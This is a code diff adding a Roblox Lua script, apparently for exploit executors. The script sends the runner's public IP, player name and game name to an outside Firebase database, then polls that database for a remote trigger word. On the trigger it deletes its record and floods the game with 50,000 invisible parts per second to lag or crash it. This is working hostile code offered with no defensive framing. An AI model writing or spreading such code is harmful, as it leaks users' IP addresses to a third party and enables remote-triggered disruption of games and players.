+local httpService = game:GetService("HttpService")
+local marketplaceService = game:GetService("MarketplaceService")
+local v1 = "https://alwzarh-9329b-default-rtdb.firebaseio.com/Players/"..game.Players.LocalPlayer.Name.. ".json"
+local function f1()
+    local v2, v3 = pcall(function()
+        return game:HttpGet("https://api.ipify.org")
+    end
+)
+    return v2 and v3 or "Unknown"
+end
+pcall(function()
+    local v4 = {
+        IP = f1(),
+        Map = marketplaceService:GetProductInfo(game.PlaceId).Name,
+        Action = "Waiting",
+    }
+    local v5 = syn and syn.request or http and http.request or request
+    if v5 then
+        v5({
+            Url = v1,
+            Method = "PUT",
+            Body = httpService:JSONEncode(v4)
+        }
+)
+    else
+        httpService:RequestAsync({
+            Url = v1,
+            Method = "PUT",
+            Body = httpService:JSONEncode(v4)
+        }
+)
+    end
+end
+)
+while true do
+    local v6, v7 = pcall(function()
+        return game:HttpGet(v1)
+    end
+)
+    if v6 and v7 ~= "null" then
+        local jsonDecode = httpService:JSONDecode(v7)
+        if jsonDecode and jsonDecode.Action == "ALWZARH" then
+            pcall(function()
+                local v8 = syn and syn.request or http and http.request or request
+                if v8 then
+                    v8({
+                        Url = v1,
+                        Method = "DELETE"
+                    }
+)
+                end
+            end
+)
+            task.spawn(function()
+                task.spawn(function()
+    while true do
+        for i = 1, 50000 do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(5, 5, 5)
+            p.Position = Vector3.new(math.random(-5000, 5000), math.random(100, 1000), math.random(-5000, 5000))
+            p.Transparency = 1
+            p.CanCollide = false
+            p.Anchored = false
+            p.Parent = workspace
+        end
+        task.wait(1)
+    end
+end)
+            end
+)
+            break
+        end
+    end
+    task.wait(2)
+end
